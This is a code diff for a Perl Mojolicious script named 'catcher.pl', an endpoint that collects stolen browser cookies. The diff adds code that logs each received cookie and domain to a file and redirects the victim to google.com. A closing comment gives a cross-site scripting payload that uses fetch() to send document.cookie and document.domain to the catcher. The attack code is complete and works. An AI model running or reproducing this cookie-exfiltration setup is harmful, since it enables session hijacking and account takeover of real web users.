@@ -1,7 +1,6 @@
 #!/usr/bin/env perl
 
-# draft code
-# perl catcher.pl daemon -m production -l http://*:8080
+# Use: perl catcher.pl daemon -m production -l http://*:8080
 
 use 5.018;
 use strict;
@@ -11,8 +10,18 @@ use Mojolicious::Lite -signatures;
 get "/catcher" => sub ($catcher) {
 	my $cookie = $catcher -> param("cookie");
 	my $domain = $catcher -> param("domain");
+	
+	open (my $logs, ">>", "catcher.logs");
+	print $logs "[+] - New cookie '$cookie' from '$domain' has been catch.\n";
+	close ($logs);
 
-	print "[ + ] - Your cookie is $cookie";
+	return (
+		$catcher -> render (
+			text => "<script>window.location='https://google.com';</script>"
+		)
+	);
 };
 
 app -> start();
+# http://127.0.0.1:8080/catcher?domain=www.heitorgouvea.me&cookie=HSAUDSNDSLKNDS
+# <script>fetch("http://localhost:8080/catcher?domain=" + document.domain + "&cookie=" + document.cookie );</script>
